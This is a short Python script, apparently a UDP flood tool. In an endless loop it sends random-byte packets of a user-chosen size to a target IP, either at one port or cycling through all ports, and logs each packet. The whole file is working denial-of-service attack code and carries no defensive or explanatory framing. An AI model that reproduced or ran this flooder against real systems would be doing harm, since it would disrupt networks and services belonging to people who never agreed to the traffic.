import sys
import random
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

ip = sys.argv[1]

if sys.argv[2] == "*":
    port = 0
else:
    port = int(sys.argv[2])
max_buffer_size = int(sys.argv[3])
packet = 0

while True:
    buffer = bytes(random.randbytes(max_buffer_size))
    sock.sendto(buffer, (ip, port))
    if sys.argv[2] == "*":
        port += 1
    packet += 1
    print("packet_number={0},size={1},ip={2},port={3}".format(packet, len(buffer), ip, port))

    if port >= 65534:
        port = 1